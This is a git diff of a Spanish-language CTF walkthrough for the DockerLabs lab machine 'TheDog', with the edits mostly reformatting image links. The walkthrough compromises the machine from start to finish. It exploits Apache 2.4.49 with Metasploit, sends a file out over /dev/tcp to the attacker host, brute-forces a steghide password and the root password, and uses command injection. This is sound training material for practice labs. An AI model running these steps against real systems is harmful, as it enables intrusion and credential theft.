@@ -1,3 +1,4 @@
+# TheDog
 
 TheDog es una máquina de dificultad media de la plataforma DockerLabs. En este walkthrough recorremos toda la cadena de compromiso: desde la enumeración inicial del servicio web, pasando por la explotación de una vulnerabilidad conocida en Apache, hasta la escalada de privilegios apoyándonos en esteganografía y credenciales embebidas en un binario.
 
@@ -13,7 +14,7 @@ Como siempre, levantamos la máquina con el script de despliegue de DockerLabs:
 sudo bash auto_deploy.sh thedog.tar
 ```
 
-![[Pasted image 20260730183318.png]]
+![](<imagenes/Pasted image 20260730183318.png>)
 
 Con la máquina en marcha y su IP asignada (172.17.0.2), empezamos el reconocimiento.
 
@@ -27,7 +28,7 @@ Lanzamos un escaneo completo de puertos con nmap para identificar qué servicios
 sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
 ```
 
-![[Pasted image 20260730183451.png]]
+![](<imagenes/Pasted image 20260730183451.png>)
 
 El escaneo nos confirma que el puerto 80 está abierto. Al ser el único punto de entrada visible, el vector de ataque pasa por el servicio web.
 
@@ -37,7 +38,7 @@ El escaneo nos confirma que el puerto 80 está abierto. Al ser el único punto d
 
 Abrimos el navegador y accedemos a la página para ver qué se está sirviendo:
 
-![[Pasted image 20260730183628.png]]
+![](<imagenes/Pasted image 20260730183628.png>)
 
 Revisamos el código fuente por si hubiera información útil que no se muestra en pantalla, y encontramos la siguiente línea:
 
@@ -45,7 +46,7 @@ Revisamos el código fuente por si hubiera información útil que no se muestra 
 <div data-note="Hay pistas en un html , fuzzing de ficheros"></div>
 ```
 
-![[Pasted image 20260730184544.png]]
+![](<imagenes/Pasted image 20260730184544.png>)
 
 La propia página nos deja una pista: hay que hacer fuzzing de ficheros para descubrir rutas ocultas.
 
@@ -59,7 +60,7 @@ Siguiendo la pista, hacemos fuzzing de las rutas de la web con dirb y el diccion
 dirb http://172.17.0.2 /usr/share/wordlists/dirb/common.txt
 ```
 
-![[Pasted image 20260730190036.png]]
+![](<imagenes/Pasted image 20260730190036.png>)
 
 ---
 
@@ -71,7 +72,7 @@ Con la información recopilada, nos fijamos en la versión de Apache para compro
 search apache 2.4.49
 ```
 
-![[Pasted image 20260730191751.png]]
+![](<imagenes/Pasted image 20260730191751.png>)
 
 Vemos que hay varios módulos disponibles. Apache 2.4.49 arrastra una vulnerabilidad conocida, así que probamos con el primero de la lista.
 
@@ -81,7 +82,7 @@ Vemos que hay varios módulos disponibles. Apache 2.4.49 arrastra una vulnerabil
 
 Seleccionamos el módulo y lo configuramos con los parámetros de la máquina objetivo y de nuestra máquina atacante:
 
-![[Pasted image 20260730192251.png]]
+![](<imagenes/Pasted image 20260730192251.png>)
 
 ```
 set RHOSTS 172.17.0.2
@@ -91,11 +92,11 @@ set RPORT 80
 run
 ```
 
-![[Pasted image 20260730192639.png]]
+![](<imagenes/Pasted image 20260730192639.png>)
 
 La explotación nos devuelve una sesión de Meterpreter. Comprobamos el id y vemos que somos www-data, el usuario con el que corre el servidor web:
 
-![[Pasted image 20260730192756.png]]
+![](<imagenes/Pasted image 20260730192756.png>)
 
 Abrimos una shell y la estabilizamos:
 
@@ -103,7 +104,7 @@ Abrimos una shell y la estabilizamos:
 /bin/bash -i
 ```
 
-![[Pasted image 20260730192929.png]]
+![](<imagenes/Pasted image 20260730192929.png>)
 
 ---
 
@@ -115,15 +116,15 @@ Ya dentro, empezamos a enumerar qué puede tocar www-data. Buscamos ficheros que
 find / -group www-data 2>/dev/null | grep -v /proc/
 ```
 
-![[Pasted image 20260730194030.png]]
+![](<imagenes/Pasted image 20260730194030.png>)
 
 Encontramos varios archivos. Empezamos por el `.stego`:
 
-![[Pasted image 20260730194217.png]]
+![](<imagenes/Pasted image 20260730194217.png>)
 
 Este archivo nos indica que hay un fichero que esconde una contraseña. Revisamos el directorio completo a ver qué más hay:
 
-![[Pasted image 20260730194323.png]]
+![](<imagenes/Pasted image 20260730194323.png>)
 
 Vemos un `.txt`, así que vamos a abrirlo.
 
@@ -143,9 +144,9 @@ Y desde la shell de la máquina víctima enviamos el archivo por el socket:
 cat /usr/include/musica/miletra.txt > /dev/tcp/172.17.0.1/9000
 ```
 
-![[Pasted image 20260730194625.png]]
+![](<imagenes/Pasted image 20260730194625.png>)
 
-![[Pasted image 20260730194655.png]]
+![](<imagenes/Pasted image 20260730194655.png>)
 
 Ya tenemos el fichero en nuestra máquina.
 
@@ -171,11 +172,11 @@ for pass in $(cat /usr/share/wordlists/rockyou.txt); do
 done
 ```
 
-![[Pasted image 20260730194959.png]]
+![](<imagenes/Pasted image 20260730194959.png>)
 
 Lo ejecutamos:
 
-![[Pasted image 20260730195031.png]]
+![](<imagenes/Pasted image 20260730195031.png>)
 
 `superman` era la contraseña que protegía el fichero stego, y nos ha sacado el contenido oculto: `password:secret`.
 
@@ -189,11 +190,11 @@ Con una credencial en la mano, miramos qué usuarios pueden iniciar sesión en e
 cat /etc/passwd | grep -v nologin
 ```
 
-![[Pasted image 20260730195600.png]]
+![](<imagenes/Pasted image 20260730195600.png>)
 
 Aparece otro usuario, punky. Probamos la contraseña recuperada (`secret`) con ese usuario:
 
-![[Pasted image 20260730195715.png]]
+![](<imagenes/Pasted image 20260730195715.png>)
 
 Funciona: ya somos punky.
 
@@ -203,7 +204,7 @@ Funciona: ya somos punky.
 
 Como punky, revisamos los binarios del sistema a ver si hay algo aprovechable:
 
-![[Pasted image 20260730195955.png]]
+![](<imagenes/Pasted image 20260730195955.png>)
 
 Nos llama la atención uno: `task_manager`. Miramos su ayuda para entender qué hace:
 
@@ -211,11 +212,11 @@ Nos llama la atención uno: `task_manager`. Miramos su ayuda para entender qué 
 /usr/local/bin/task_manager -h
 ```
 
-![[Pasted image 20260730200247.png]]
+![](<imagenes/Pasted image 20260730200247.png>)
 
 Con la ayuda a la vista, probamos si es vulnerable a inyección de comandos:
 
-![[Pasted image 20260730200557.png]]
+![](<imagenes/Pasted image 20260730200557.png>)
 
 La inyección funciona, pero no nos da privilegios de root.
 
@@ -225,7 +226,7 @@ La inyección funciona, pero no nos da privilegios de root.
 
 Como por esa vía no conseguimos root, cambiamos de enfoque y extraemos las cadenas del binario con `strings`, por si hubiera contraseñas embebidas:
 
-![[Pasted image 20260730200828.png]]
+![](<imagenes/Pasted image 20260730200828.png>)
 
 Dentro salen varias contraseñas, así que las metemos en un archivo:
 
@@ -259,7 +260,7 @@ EOF
 while read pass; do echo "$pass" | timeout 2 su root -c 'id' 2>/dev/null | grep -q "uid=0" && echo "[+] PASSWORD ROOT: $pass" && break; done < /tmp/passwords.txt
 ```
 
-![[Pasted image 20260730201132.png]]
+![](<imagenes/Pasted image 20260730201132.png>)
 
 El bucle nos devuelve la contraseña de root.
 
@@ -269,7 +270,7 @@ El bucle nos devuelve la contraseña de root.
 
 Solo queda usar la contraseña para autenticarnos como root:
 
-![[Pasted image 20260730201224.png]]
+![](<imagenes/Pasted image 20260730201224.png>)
 
 Con esto la máquina queda comprometida por completo.
 
